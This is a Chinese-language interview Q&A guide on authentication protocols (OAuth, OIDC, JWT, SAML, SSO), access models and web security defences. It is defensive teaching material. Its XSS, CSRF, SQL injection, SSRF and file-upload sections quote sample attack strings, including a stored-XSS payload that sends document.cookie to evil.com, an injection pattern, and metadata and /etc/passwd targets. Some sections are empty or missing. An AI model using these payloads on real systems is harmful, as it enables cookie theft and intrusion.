0x00 认证与授权

Q1：OAuth 2.0 有哪四种授权模式？PKCE 解决了什么问题？

标准答案

OAuth 2.0 定义了四种授权模式：

  1. 授权码模式（Authorization Code Grant）：最推荐的方式。客户端将用户重定向到授权服务器，用户认证后授权服务器返回授权码，客户端用授权码换取 access token。适用于有后端的 Web 应用。
  2. 隐式模式（Implicit Grant）：直接返回 access token（URL fragment），不经过授权码步骤。设计初衷是给纯前端 SPA 使用。已在 OAuth 2.1 中废弃。
  3. 密码模式（Resource Owner Password Credentials Grant）：用户直接把用户名密码交给客户端，客户端用它们换取 token。已在 OAuth 2.1 中废弃。
  4. 客户端凭证模式（Client Credentials Grant）：客户端用自己的凭证（client_id + client_secret）直接换取 token，无用户参与。适用于 M2M（机器对机器）场景。

PKCE（Proof Key for Code Exchange）：授权码模式的增强扩展。原始授权码模式假设客户端能安全保存 client_secret（机密客户端），但原生 App 或 SPA 无法做到。PKCE 的工作流程：

  • 客户端生成一个 code_verifier（随机字符串，43-128 字符）
  • 计算 code_challenge = SHA256(code_verifier)（或 plain）
  • 授权请求时附带 code_challenge 和 code_challenge_method
  • 换取 token 时附带 code_verifier，授权服务器比对 hash

即使攻击者截获了授权码，没有 code_verifier 也无法换取 token。PKCE 现在被 OAuth 2.1 要求对所有客户端类型强制使用。

深入思考

  • 边界情况：PKCE 能否防止授权码注入（Authorization Code Injection）？可以。攻击者窃取授权码后，因为没有 code_verifier，无法完成 token 交换。但如果攻击者同时控制了客户端的 redirect_uri…则需要结合 Exact Redirect URI Matching 来防御。
  • OAuth 2.0 Security BCP（RFC 9700，2025年1月发布）：明确要求：所有授权码流程必须使用 PKCE，即使是机密客户端（有 client_secret 的也要用）。另外推荐 sender-constrained tokens 和 refresh token rotation。
  • 密码模式为何危险：应用程序直接接触用户密码，存在存储风险；且密码模式不支持两步验证、SSO 等高级认证机制。攻击面全部集中在客户端。
  • 隐式模式的问题：access token 出现在 URL 中，泄露给浏览器历史、Referer header、服务器日志。且无法做 refresh token，用户体验差。

参考链接

  • RFC 7636 - Proof Key for Code Exchange (PKCE)
  • RFC 9700 - OAuth 2.0 Security Best Current Practice (2025)
  • https://oauth.net/2/pkce/

Q2：OAuth 2.1 相比 2.0 有哪些关键变化？

标准答案

OAuth 2.1 不是一个全新的协议，而是将多年来的安全实践整合为一个统一的规范，消除了 “需要交叉引用十几个 RFC 才能写出安全的 OAuth” 的问题。主要变化：

  1. 废弃隐式模式：response_type=token 完全移除。替代方案：SPA 使用授权码模式 + PKCE。
  2. 废弃密码模式：grant_type=password 完全移除。替代方案：使用授权码模式或 ROPC 迁移到专用身份协议（如 OIDC）。
  3. PKCE 必选：所有使用授权码模式的客户端都必须使用 PKCE，包括机密客户端。
  4. Refresh Token 安全：对于公开客户端，refresh token 必须是 sender-constrained 或一次性使用（rotation）。防止 refresh token 泄露后的持续访问。
  5. Redirect URI 严格匹配：要求 exact match（精确匹配），不再允许 pattern match 或 wildcard。
  6. Bearer Token 安全：明确要求 token 使用 HTTPS 传输，推荐 sender-constrained tokens（如 mTLS-bound tokens 或 DPoP）。

深入思考

  • 迁移影响：如果你的系统还在用隐式模式或密码模式，需要立即规划迁移。密码模式迁移到授权码模式 + PKCE 意味着需要用户交互界面。对于 M2M 场景，客户端凭证模式在 2.1 中仍合法，但需要注意 client secret 的静态凭证生命周期管理。
  • **向前兼容吗？**兼容的。OAuth 2.1 相当于从协议层面砍掉了已经被 BCP 宣判死刑的模式。如果授权服务器继续接受旧模式，它本质上仍是 2.0 实现。
  • OAuth 2.1 不覆盖但重要的点：M2M 认证仍依赖静态 client secret，这是已知攻击面。Workload Identity Federation 和 SPIFFE 是补充方案。

参考链接

  • https://oauth.net/2.1/
  • RFC 9700 - OAuth 2.0 Security Best Current Practice
  • “OAuth 2.1 Authorization Framework” draft-ietf-oauth-v2-1

Q3：OIDC（OpenID Connect）是什么？和 OAuth 2.0 的关系？

标准答案

OIDC 是在 OAuth 2.0 之上的身份认证层。OAuth 2.0 本身只做授权（”允许应用访问这些资源”），不做认证（”确认用户是谁”）。OIDC 通过引入 ID Token（JWT 格式）解决了这个问题。

核心概念：

  • ID Token：JWT 格式的身份声明，包含 iss（签发者）、sub（用户标识）、aud（受众）、exp、iat、nonce 等标准 claim。
  • UserInfo Endpoint：OIDC 提供的 RESTful 接口，返回用户的标准 claim（name、email、picture 等）。
  • Discovery 文档：/.well-known/openid-configuration 发布授权服务器元数据（端点 URL、支持的 scope、签名算法等）。
  • Scopes：OIDC 引入 openid scope（必选），profile、email、address、phone 等标准 scope。

流程简化：

  1. 客户端发起认证请求（包含 openid scope）
  2. 用户认证并同意
  3. 授权服务器返回授权码
  4. 客户端用授权码换取 ID Token + Access Token
  5. 客户端验证 ID Token 的签名、iss、aud、exp、nonce
  6. （可选）用 Access Token 调用 UserInfo Endpoint 获取更多用户信息

深入思考

  • 为什么不直接用 OAuth 2.0 做认证？ 典型错误：用 OAuth 2.0 授权码模式获取 access token，再调 API 拿用户信息。这种方案没有标准化的 ID Token，认证结果不可验证（没有签名，没有 nonce 防重放），容易受到混淆代理攻击（Confused Deputy Problem）。
  • ID Token 验证要点：验证签名（用 JWKS 端点获取公钥）、验证 iss（精确匹配）、验证 aud（必须包含自己的 client_id）、验证 exp、验证 nonce（防重放）。不要跳过任何一个步骤。
  • OIDC Flow 选择：Web 应用用 Authorization Code Flow + PKCE；纯 SPA 也是这套；M2M 不需要用户认证，直接用 OAuth 2.0 Client Credentials。

Q4：JWT 的结构、签名、常见漏洞及生产最佳实践

标准答案

JWT 结构：三段 base64url 编码的字符串，用 . 分隔。

  • Header：{"alg":"HS256","typ":"JWT"} — 包含算法和 token 类型
  • Payload：Claims（注册 claims、公共 claims、私有 claims）
  • Signature：对前两段的签名，算法由 header 指定

签名算法：

  • HS256/HS384/HS512：HMAC + SHA，对称签名。同一方签名和验证。
  • RS256/RS384/RS512：RSA + SHA，非对称签名。私钥签名，公钥验证。
  • ES256/ES384/ES512：ECDSA + SHA，非对称签名。更高效的椭圆曲线。
  • EdDSA：Edwards Curve DSA，现代非对称签名。

常见漏洞：

  1. alg=none 攻击：攻击者将 header 中的 alg 改为 none，服务端可能跳过签名验证。

  2. 密钥混淆攻击（Key Confusion）：如果服务端使用 RSA 公钥验证，攻击者可以获取公钥，将 alg 改为 HS256，用公钥作为 HMAC 密钥签名。服务端（预期 RS256）误用 HS256 路径，用公钥验证通过。

  3. 密钥破解：对称密钥强度不足时，可被暴力破解。确保密钥熵 >= 256 bits。

  4. JWT 注入：服务端从用户输入构造 JWT，导致注入攻击。

生产最佳实践：

  • 明确指定算法：验证时始终传递 algorithms 参数，不接受用户输入的算法
  • 使用非对称签名：RS256/ES256 优于 HS256，公钥可安全分发，私钥不存在于验证端
  • 短过期时间：access token 15 分钟，refresh token 7-30 天
  • 不在 JWT 中保存敏感数据：payload 只是 base64 编码而非加密
  • 配合黑名单/吊销列表：JWT 无状态的代价是无法即时吊销，需配合黑名单或短 TTL
  • 使用 jti（JWT ID）：唯一标识，有助于检测重放
  • 监听签名泄漏：使用强随机密钥，git 中不提交密钥文件

深入思考

  • 无状态 vs 有状态：JWT 无状态是双刃剑——不需要查数据库，但无法立即吊销。需要权衡：对安全要求高的场景（密码修改、账号冻结）必须维护黑名单。
  • JWT vs Opaque Token：Opaque Token 需要服务端查存储换取真实信息，适合需要即时吊销的高安全场景。JWT 适合低延迟、分布式场景但接受无法即时吊销的风险。两者可以组合：opaque token 做 access token，对应 payload 查 Redis 缓存 JWT 信息。
  • 审计日志中的 JWT：JWT 的 payload 可被解码，且会出现在 HTTP headers 的 Authorization 中，可能被日志系统记录。敏感信息应该加密或使用 JWE（JSON Web Encryption）。

Q5：Session vs JWT 选型决策树

标准答案

这是一个经典的架构决策，没有绝对的对错，关键看场景。

Session（服务端存储）：

  • 优点：可即时吊销、不暴露数据结构、服务端完全控制
  • 缺点：需要存储（内存/Redis/DB）、分布式需要会话共享、不适合跨域

JWT：

  • 优点：无状态、跨域友好（SSO）、减少数据库查询、适合移动端
  • 缺点：无法即时吊销、payload 可解码、存储膨胀（header 大小）、轮换复杂性

决策树：

深入思考

  • 混合方案：生产中最常见的模式是 “JWT + 短过期 + Refresh Token Rotation”。JWT 15 分钟过期，使用 refresh token（可吊销、可轮换）换取新 JWT。这种方式兼顾了 JWT 的低延迟和 Session 的可吊销特性。
  • 15 分钟空窗期：JWT 方案在过期前存在安全空窗——账户被封后 JWT 仍然有效。可通过检查用户状态拦截（请求进入时查 Redis 黑名单），但这又回到了有状态，需要权衡。
  • Header 大小问题：JWT 可能携带大量 claims，每次请求都带在 Authorization header 中，可能接近 Nginx/AWS ALB 的 header 大小限制（通常 8K-16K）。

Q6：SAML 2.0 vs OAuth 2.0 vs OIDC 对比

标准答案

维度 SAML 2.0 OAuth 2.0 OIDC
目的 认证 + 授权 仅授权 认证 + 授权
传输格式 XML JSON JWT
主要 Token SAML Assertion Access Token（Opaque/JWT） ID Token（JWT）+ Access Token
使用场景 企业 SSO（ADFS/Okta） API 授权、第三方登录 现代 App 登录、API 授权
移动端支持 差（浏览器重定向） 好（PKCE） 好（OIDC Flow）
API 友好度 低（XML 笨重） 高（JSON 轻量） 高（JWT 标准 Claims）
协议层 浏览器 Profile + SOAP HTTP + JSON HTTP + JWT
身份提供方 IdP AS（Authorization Server） OP（OpenID Provider）
应用场景 企业入职/离职流程、SaaS 联盟 GitHub/Google API 授权 Google/Facebook 登录

选型建议：

  • 需要企业级 SSO + Legacy IdP 集成？ → SAML 2.0（ADFS、Active Directory）
  • 需要 API 授权（第三方 App 访问用户数据）？ → OAuth 2.0
  • 需要现代 App 登录（移动/SPA）？ → OIDC
  • SSO 同时需要 API 访问？ → OIDC（最佳组合）
  • 大多数现代项目：OIDC（因为它 = OAuth 2.0 授权 + 标准化认证）

深入思考

  • SAML 的持久力：虽然 XML 笨重，但企业界大量使用 SAML，因为它在企业 SSO 领域的标准地位（SAML 2.0 发布至今已有 20 年）。全栈开发者至少需要能读懂 SAML Assertion、理解 IdP-initiated 和 SP-initiated 流程。
  • 混淆代理攻击（Confused Deputy）：OAuth 2.0 做认证时容易被第三方 App 冒充。OIDC 通过 ID Token 的 aud claim（唯一标识接收方）解决此问题。
  • SAML vs OAuth 联合场景：大型企业常见的模式是 SAML federation 做身份层，OAuth/OIDC 做 API 授权层。Shibboleth + Keycloak 架构就是典型。

Q7：SSO 实现原理（CAS / SAML / OIDC）

标准答案

SSO 的核心思想：一次认证，多处访问。用户在一个系统登录后，访问其他关联系统时不需要重新输入密码。

三种主流实现：

CAS（Central Authentication Service）：

  • 经典的 Web SSO 协议
  • 核心是 Ticket Granting Ticket (TGT) 和 Service Ticket (ST)
  • 流程：用户访问 App A → 重定向到 CAS Server → CAS Server 检查是否有 TGT cookie → 没有则让用户登录 → 登录成功后设置 TGT cookie，生成 ST → 用户带 ST 访问 App A → App A 通过 CAS Server 验证 ST → 认证成功
  • 访问 App B 时：携带 TGT cookie 到 CAS Server，直接生成 ST 给 App B，无需再次登录

SAML（Security Assertion Markup Language）：

  • IdP-initiated SSO：用户先从 IdP 登录，IdP 发送 SAML Assertion 到 SP
  • SP-initiated SSO：用户访问 SP 受保护资源，SP 生成 AuthnRequest，重定向用户到 IdP，IdP 认证后发送 Assertion
  • 核心：XML 格式的 SAML Assertion（包含 Subject、Conditions、AttributeStatement、AuthnStatement）

OIDC（OpenID Connect）：

  • 基于 OAuth 2.0 的现代 SSO
  • 核心是 ID Token（JWT）+ 心跳检测（Session Management）
  • 支持 RP-initiated Logout 和 Session Logout 标准
  • 通过 sid（Session ID）claim 关联用户会话

生产实践要点：

  • SSO 不是银弹：跨域 SSO（不同域名）比同域 SSO 复杂得多
  • 单点退出（SLO）是难点：需要通知所有关联服务销毁会话
  • 高可用 IdP 是关键：IdP 挂了整个系统无法登录

深入思考

  • 同域 SSO：最简单，共享 Cookie（domain=.example.com）。所有子域名应用读取同一个 Session。
  • 跨域 SSO：需要协议支持（CAS/SAML/OIDC）。核心模式是主域名认证后，各子域名通过 token 换取本地 session。
  • Session 心跳：大型系统通常会做 Session 心跳检测，防止用户退出后认证信息残留。
  • SLO 的挑战：用户在一处登出后，IdP 需要通知所有已认证的服务。OIDC 的 RP-initiated Logout 和 SAML 的 LogoutRequest 都尝试解决这个问题，但网络分区、服务下线等情况会导致不完整注销。

0x01 权限模型

Q8：RBAC（Role-Based Access Control）核心概念和变体

标准答案

核心 RBAC（RBAC0）：

  • 用户（User）：系统操作者
  • 角色（Role）：权限的集合，如 admin、editor、viewer
  • 权限（Permission）：对特定资源的操作，如 document:write
  • 用户分配角色，角色分配权限（User-Role Assignment + Role-Permission Assignment）

核心 RBAC 的三条规则：

  1. 角色继承（RBAC1）：角色可以继承。admin 继承 editor 的所有权限，editor 继承 viewer 的所有权限。
  2. 职责分离（RBAC2/SOD）：SOD（Separation of Duties）确保同一用户不能同时分配冲突角色。
    • 静态 SOD：用户不可同时分配 order_approver 和 order_creator
    • 动态 SOD：运行时检查，同一会话中不能同时扮演两个冲突角色

Q12：XSS（跨站脚本攻击）类型与防御

标准答案

三种 XSS 类型：

  1. 反射型（Reflected XSS）：恶意脚本在 URL 参数中，服务端不经过滤直接反射到响应中。需要用户点击恶意链接。

    • 示例：https://example.com/search?q=<script>alert('xss')</script>

  2. 存储型（Stored XSS）：恶意脚本被持久化存储到服务器（如数据库、评论系统），每次其他用户访问时执行。最危险。

    • 示例：用户在评论区提交 <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

  3. DOM 型（DOM-based XSS）：纯客户端攻击，恶意脚本通过修改页面 DOM 环境执行。服务端不参与。

    • 示例：location.hash 被注入 <img src=x onerror=alert(1)>

防御策略：

  1. CSP（Content Security Policy）：最有力的纵深防御手段

    • nonce 模式：只允许带有指定 nonce 的内联脚本执行
    • strict-dynamic：信任链传递，被信任的脚本创建的其他脚本也被信任
    • 禁止 'unsafe-inline'，除非 legacy 系统必须

  2. 输出编码（Output Encoding）：根据上下文（HTML/JS/CSS/URL）进行编码

    • HTML 上下文：< → &lt;，> → &gt;，& → &amp;
    • JavaScript 上下文：\x3C、\u003C
    • URL 上下文：encodeURIComponent()

  3. 输入验证：验证而非过滤。白名单模式优于黑名单。

  4. HttpOnly Cookie：标记 Set-Cookie 为 HttpOnly，防止 JS 读取 cookie。

  5. X-XSS-Protection：已废弃，不建议使用。

深入思考

  • CSP 绕过：CSP 不是万能的。如果页面存在 JSONP 端点、CDN 上有已知的 Angular/Prototype 库、或设置了过于宽松的 script-src（如 'unsafe-inline'，'unsafe-eval'），CSP 可以被绕过。strict-dynamic + nonce 是最安全的 CSP 配置。
  • Mutation XSS（mXSS）：利用浏览器 HTML 解析器在不同上下文下的行为差异绕过过滤。防御难度高，CSP 是最有效的屏障。
  • Library 层面的自动编码：React 默认对 JSX 表达式进行 HTML 转义；Vue 模板默认也是转义输出。但 dangerouslySetInnerHTML 和 v-html 会跳过保护。

  • Content Security Policy (W3C)
  • https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

Q13：CSRF（跨站请求伪造）与防御

标准答案

CSRF 原理：用户已登录目标网站，攻击者诱导用户在不知情的情况下发起恶意请求。

防御手段（按推荐优先级）：

  1. SameSite Cookie（首选）：

    • SameSite=Lax：顶层导航（GET 链接、GET 表单）允许发送 cookie，POST 等改变状态的操作不允许
    • SameSite=Strict：完全禁止跨站发送 cookie
    • SameSite=None：需同时设置 Secure，允许跨站发送 cookie（谨慎使用）

  2. CSRF Token：

    • 服务端生成一个随机 token 嵌入表单或自定义 header
    • 提交请求时验证 token
    • 不适用于所有请求模式的 API；REST API 更适合使用自定义 token header

  3. Referer/Origin 验证：

    • 验证 Referer 或 Origin header 是否来自可信域名
    • 但有些浏览器/代理可能不发送 Referer header

  4. 自定义 Request Header：

    • 对 API 强制要求 X-Requested-With: XMLHttpRequest 等 header
    • 浏览器跨站请求无法添加自定义 header（需 preflight）

最佳实践：

  • SPA + API 架构：使用 SameSite=Lax + 自定义 Header + Authorization Bearer Token（不在 cookie 中）是黄金组合
  • 传统表单应用：SameSite cookie + CSRF token 双重保护
  • 现代浏览器（2025+）：SameSite 默认 Lax，覆盖了绝大多数 CSRF 场景

深入思考

  • SameSite 的局限性：SameSite=Lax 不能防御顶级导航的 GET 请求 CSRF（如 GET /delete?id=1），虽然 GET 不应该改变状态，但实践中很多 API 设计不当。同站子域名之间的攻击 SameSite 也防不住。
  • API-only 服务：CSRF 对纯 API 服务（移动端、服务端调用）不是问题。重点是浏览器同源策略。API 用 Bearer Token + Cookie JWT 场景才需要 CSRF 防护。
  • CSRF 与 CORS 的关系：CSRF 攻击不需要 CORS（跨域请求自动发送 cookie），而 CORS 用于跨域读取响应。CSRF 防御的核心是让浏览器不发 cookie 或者让服务端拒绝跨站请求。

Q14：SQL 注入防御全面方案

标准答案

防御层次（从最推荐到补充）：

  1. 参数化查询（Prepared Statements）：最核心的防线

  2. MyBatis #{} vs ${} 的区别

    • #{}：参数化，生成 PreparedStatement，安全
    • ${}：字符串拼接，有 SQL 注入风险
    • 严禁对用户输入使用 ${}。仅在动态表名、列名等确有必要时使用，且必须做白名单校验

  3. ORM 框架安全使用：

    • Hibernate/Entity Framework 等 ORM 底层使用参数化查询，通常是安全的
    • 但原生 SQL、HQL 拼接、createNativeQuery 可能引入风险
    • 警惕 ORM 的 N+1 问题变成 DDoS 向量

  4. 架构层防御：

    • 最小权限数据库用户：应用数据库账号只允许必要的 DML（SELECT/INSERT/UPDATE/DELETE），禁止 DDL（DROP/ALTER/CREATE）
    • WAF：ModSecurity 等 WAF 可以作为 SQL 注入的纵深防御层
    • 输入验证：对明显的 SQL 注入模式（' OR 1=1--、UNION SELECT）做输入过滤（但不可依赖，因为存在大量变体）
    • 数据库连接鉴权：使用 mTLS 或 IP whitelist 限制来源

  5. 错误信息处理：永远不要将数据库错误信息直接返回给用户，防止信息泄露

深入思考

  • 二阶 SQL 注入：攻击者将恶意数据存入数据库，另一个查询触发。参数化查询仍然可以防御（第二次查询也是参数化的），但 ORM 的延迟加载、原生查询可能有问题。
  • NoSQL 注入：MongoDB、Elasticsearch 等 NoSQL 同样存在注入风险。MongoDB 的 $where 和 $gte 注入是典型例子。不要因为用了 NoSQL 就认为不需要参数化。
  • MyBatis 常见踩坑：IN 子句使用 #{} 会报错吗？MyBatis 3+ 支持 collection 遍历，<foreach collection="ids" item="id" separator=",">#{id}</foreach> 是安全的。

Q15：SSRF（服务端请求伪造）攻击与防御

标准答案

SSRF 原理：攻击者利用服务端发起请求的功能（如 URL 抓取、Webhook、API 代理），将目标指向内部网络或云元数据服务。

常见攻击目标：

  • 云元数据：http://169.254.169.254/latest/meta-data/（AWS/GCP/Azure）
  • 内网服务：http://localhost:6379（Redis）、http://localhost:9200（Elasticsearch）
  • 内部管理接口：http://internal-admin:8080/shutdown
  • 文件协议：file:///etc/passwd

防御策略：

  1. URL 白名单：只允许请求已注册的域名/IP 列表

  2. 内网隔离（边界防御）：

    • 应用部署在无外网权限的容器/网络中
    • 使用 Kubernetes NetworkPolicy 限制出口
    • 在 VPC 级别用防火墙规则阻止出站到内网

  3. 协议限制：禁止 file://、gopher://、dict:// 等非 HTTP 协议

  4. DNS 解析检查：先解析域名，检查和目标 IP 是否匹配

  5. 转发的请求中不携带敏感凭证：移除认证信息、Cookie 等

  6. 永不信任用户提供的完整 URL：将用户输入作为参数而非路径使用

深入思考

  • SSRF 难在”盲判断”：攻击者往往看不到响应内容（Blind SSRF），但可以通过时间、错误码、DNS 回显来判断内部网络结构。防御 SSRF 时不能只依赖”返回内容安全”，还要防止信息侧信道。
  • DNS Rebinding 攻击：攻击者设置一个域名，第一次解析到白名单 IP，通过验证后再次解析到内网 IP。防御方案：在发起 HTTP 请求之前和之后都做 DNS 解析校验（double-check），或使用 IP 绑定持久连接。
  • 2025 年 SSRF 趋势：云环境下的 SSRF 更危险——元数据端点（169.254.169.254）暴露的是云服务凭证（AWS IAM Role 临时凭证）。2023-2024 年 SSRF 攻击量增长了 452%。

Q16：文件上传漏洞与防御

标准答案

文件上传攻击面：

  • Webshell 上传（.php、.jsp、.asp、.war 等可执行文件）
  • XSS 攻击（上传 HTML/SVG 文件包含恶意脚本）
  • 路径穿越（../../../etc/passwd 覆盖系统文件）
  • 大文件耗尽磁盘/DDoS
  • 上传文件包含恶意软件/病毒

纵深防御策略：

  1. 文件类型校验：

    • MIME 类型检查（但容易被伪造）：Content-Type: image/jpeg
    • 魔数签名检查（Magic Bytes）：检查文件头部字节

  2. 存储安全：

    • 文件名重命名（UUID 或哈希），不使用用户提供的原始文件名
    • 文件存储到外部存储（S3/MinIO），不放置在 web root 下
    • 设置不可执行权限

  3. 内容安全：

    • 对图片重新编码（Reresize + Recompress），清除潜在 payload
    • 对 SVG/HTML 文件进行 XSS 过滤
    • PDF 文件渲染时使用沙箱

  4. 大小限制：前端+后端双重限制文件大小

  5. 访问控制：

    • 文件访问路径使用随机 token 而非顺序 ID
    • 上传后不直接返回可访问 URL，而是通过中间层鉴权

深入思考

  • 文件上传 + CDN 场景：文件上传到 S3 后通过 CDN 分发，攻击者无法访问 web root，但需要防范 CDN 上的缓存投毒和未授权访问。
  • 图片重编码的陷阱：攻击者可以在图片中嵌入 EXIF 数据存储 payload。重编码（re-encoding）可以清除 EXIF，但 WebP 和 AVIF 等现代格式可能有不同的处理方式。
  • SVG 上传风险：SVG 支持 <script> 标签和外部资源引用，是最危险的”图片”格式。处理 SVG 时应 strip 所有 JS 内容，禁用外部资源加载。
  • Content-Disposition 攻击：即使用户上传的是图片，下载时文件名可能被用于攻击。确保设置 Content-Disposition: attachment; filename="..."（避免 XSS payload 伪装为 PDF 被浏览器解析）。

Q17：不安全的反序列化漏洞

标准答案

原理：应用程序将不可信数据反序列化为对象时，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。

高危场景：

  • Java：ObjectInputStream.readObject()、readUnshared()、XMLDecoder
  • Python：pickle.loads()、yaml.load()（非 safe_load）
  • Node.js：node-serialize、eval() 或 new Function() 间接
  • PHP：unserialize()、__wakeup()/__destruct() 魔术方法
  • Ruby：Marshal.load()、YAML.load()

经典攻击链（Java）：

Java 中常见的反序列化利用链：

  • CommonsCollections (CC)
  • Fastjson (autoType)
  • Jackson (enableDefaultTyping)
  • XStream
  • JDK 原生（SignedObject、RMIConnectionImpl）

防御策略：

  1. 不使用反序列化处理不可信数据：首选 JSON 等简单格式
  2. 使用白名单/黑名单过滤类（Java ObjectInputFilter）：
  3. 使用替代序列化格式：Protocol Buffers、MessagePack、JSON
  4. 签名验证：对序列化数据添加 HMAC 签名，验证签名后再反序列化
  5. 使用安全的反序列化库：如 YAML.safe_load()、json.loads()

  • Fastjson 案例：Fastjson 在开启了 autoType 支持后，攻击者可以通过 @type 指定任意类，调用其 setter/getter 方法。即使禁用 autoType，也存在绕过手段（如缓存碰撞）。
  • Kryo 和 Protostuff：这类”更快的序列化”框架不一定更安全。它们的类注册机制可以防御一部分攻击，但如果开启了”类名可以通过数据指定”模式，风险仍然存在。
  • 2025 年趋势：Kubernates 生态中的 Go 语言序列化漏洞增加，encoding/gob 和 encoding/binary 的滥用是新的攻击方向。

Q18：API 速率限制：令牌桶、漏桶、滑动窗口

标准答案

三种算法比较：

  1. 令牌桶（Token Bucket）：

    • 桶容量 = 最大突发量，速率 = 令牌填充速率
    • 允许突发（桶满时突发请求），平均速率受控
    • 适合：Web API、正常流量有突发但整体可控的场景

  2. 漏桶（Leaky Bucket）：

    • 请求进入桶，以固定速率”漏出”。桶满则丢弃。
    • 没有突发能力，速率完全恒定
    • 适合：需要严格平滑流量的场景（如数据库写入）

  3. 滑动窗口（Sliding Window Log / Sliding Window Counter）：

    • Sliding Window Log：记录每个请求的时间戳，统计窗口内请求数。精确但存储量较大。
    • Sliding Window Counter：以子窗口（如 1/60 粒度）近似统计。性能好，略微牺牲精度。
    • 适合：需要精确窗口限制的场景

生产建议：

  • Redis Lua 脚本保证原子性，避免竞态条件
  • 分层限流：全局限流 + 用户级限流 + IP 级限流
  • HTTP 响应头：
  • 限流响应状态码：返回 429 Too Many Requests

深入思考

  • 分布式限流的挑战：多实例部署下，本地限流（in-memory）无法保证全局一致。Redis 集中式限流增加一次网络往返，在高 QPS 下可能成为瓶颈。解决方案：使用 Redis Cluster、本地 + 集中式两级限流。
  • 精确度与性能的权衡：Sliding Window Log 最精确但存储开销大。Token Bucket 是最实用的折中方案。实际生产中可以接受 5-10% 的误差，用 Sliding Window Counter 替代 Log。
  • 限流的”公平性”：不做公平的限流会导致”贪婪客户端”抢占资源。使用 Token Bucket 的每用户队列、或者 Weighted Fair Queuing 算法可以解决。

Q19：API 输入校验与请求签名

标准答案

输入校验（Input Validation）：

  1. JSON Schema 校验：对复杂 JSON Payload 使用 Schema 验证

  2. 白名单校验：定义可接受的输入集合，拒绝不在白名单中的值

  3. 数据类型转换：明确指定接收的数据类型，不依赖隐式转换

  4. 参数化查询：数据库查询使用参数化，不与字符串拼接

请求签名（Request Signing）：

  1. HMAC 签名（对称）：

    • 优点：简单、高性能
    • 缺点：需要共享密钥

  2. JWS（JSON Web Signature，非对称）：

    • 使用私钥签名，公钥验证
    • 优点：无需共享密钥，适合开放 API

  3. AWS Signature V4（请求级签名）：

    • 基于 HMAC-SHA256，包含请求参数、header、payload
    • 防重放（通过 timestamp + 限定有效期）
    • 防篡改（签名涵盖请求的每一个部分）

请求签名核心要素：

  • Timestamp：防止重放攻击（有效期通常 5-15 分钟）
  • Nonce：同一 timestamp 内防重放
  • Body Hash：确保请求体不被篡改
  • Signing Key 派生：AWS SigV4 方式，避免直接暴露 master key

深入思考

  • 输入校验 vs XSS 过滤：输入校验是”检查数据格式和业务规则”，XSS 过滤是”输出编码”。不要在输入层做 XSS 过滤（破坏数据完整性，且不知道最终输出上下文是 HTML/JS/URL）。
  • JSON Schema 的局限性：Schema 不能做业务逻辑验证（”订单金额不能超过账户余额”），需要业务层二次校验。
  • 请求签名的场景：支付回调（Webhook）、开放 API 网关、服务间通信。对于内部服务间通信，mTLS + 零信任架构可能优于请求签名。

  • AWS Signature V4 文档
  • JSON Schema: https://json-schema.org/

Q20：API 幂等性（Idempotency-Key）

标准答案

问题：网络不稳定时客户端可能重发同一请求，导致重复扣款、重复下单等严重后果。

幂等性方案（Idempotency-Key）：

工作原理：

  1. 客户端为每个”可能重试的操作”生成唯一 UUID
  2. 服务器首次收到请求时，处理并存储结果（key → result）
  3. 服务器收到重复请求时，直接返回已存储的结果，不重复处理
  4. 存储在 Redis 中，配置 TTL（通常 24-72 小时）

幂等性分级（从弱到强）：

  • 等幂的：GET、PUT、DELETE（HTTP 语义上等幂）
  • 非等幂的：POST（需要 Idempotency-Key 实现等幂）
  • 自然等幂：请求本身已经包含了唯一约束（如订单号作为 primary key），重复插入会失败

实现要点：

深入思考

  • 幂等键的冲突：两个不同操作用了同一个 Idempotency-Key。解决方案：key 的范围内限定资源 ID（如 payment:order_123:550e8400）。
  • 500 错误也需要缓存：如果第一次请求返回 500 且未被缓存，第二次请求还是同一个 key 时，是否重新处理？Stripe 的做法是：返回 500 也会缓存，后续重试返回同样的 500。但最好让客户端生成新 key 重试。
  • Redis 锁与 SETNX：上述实现中用了分布式锁防并发，但锁超时可能太短或过长。更好的方案是使用 Redis Watch + Transaction。

  • Stripe Idempotent Requests 文档
  • https://datatracker.ietf.org/doc/draft-ietf-httpapi-idempotency-key-header/

Q21：CORS（跨域资源共享）

标准答案

同源策略：浏览器安全基础机制，限制一个 origin 的脚本访问另一个 origin 的资源。”同源”定义：协议 + 域名 + 端口全部相同。

CORS 工作原理：服务器通过 HTTP 头部告诉浏览器允许什么跨域请求。

关键 Header：

预检请求（Preflight）：

  • 当请求满足以下任一条件时，浏览器先发 OPTIONS 预检请求：

    • 使用 GET/POST/HEAD 之外的 HTTP 方法
    • 使用了非简单请求的 header（如 Authorization、X-Custom-Header）
    • POST 的 Content-Type 不是 application/x-www-form-urlencoded、multipart/form-data 或 text/plain
    • 使用了 withCredentials: true 且带有非简单请求 header

  • 预检响应缓存：Access-Control-Max-Age 指定缓存秒数（减少 OPTIONS 请求）

credentials 模式：当请求需要携带 cookie/认证信息时：

  • Access-Control-Allow-Origin 不能为 *

生产最佳实践：

深入思考

  • CORS 不是 CSRF 防御：CORS 控制是否可以读取响应，不能阻止请求被发出。CSRF 防御阻止的是”发送更改状态的请求”。
  • CORS 通配符陷阱：Access-Control-Allow-Origin: * 会允许任何网站读取 API 响应。生产环境必须明确指定允许的 origin。
  • 反向代理场景：如果 Nginx/API Gateway 代理前端请求到后端，CORS 配置通常在网关层，后端 API 不需要关注 CORS。

Q22：GraphQL 安全

标准答案

GraphQL 的灵活性带来了独特的安全挑战：N+1 查询炸弹、深度嵌套 DoS、字段爆破。

三大防御手段：

  1. Query Depth Limit（查询深度限制）：

  2. Query Cost Analysis（查询成本分析）：
    为每个字段分配成本权重，拒绝超过预算的查询。

  3. Persisted Queries（持久化查询）：
    客户端预注册查询，服务端只接受注册过的查询。

其他防御策略：

  • 速率限制：对查询的复杂度而非请求数做限流
  • 超时控制：设置单个查询的最大执行时间
  • Batch Limiting：限制 first/last 参数的最大值（分页防御）
  • Alias 限制：防止通过别名重复请求同一字段
  • Introspection 关闭：生产环境关闭 Schema Introspection（除非有管理界面）

深入思考

  • Depth vs Cost：Depth limit 只能防嵌套 DoS，不能防宽度攻击（同层级请求 100 个字段）。Cost analysis 更全面，但需要仔细配置每个字段的复杂度。
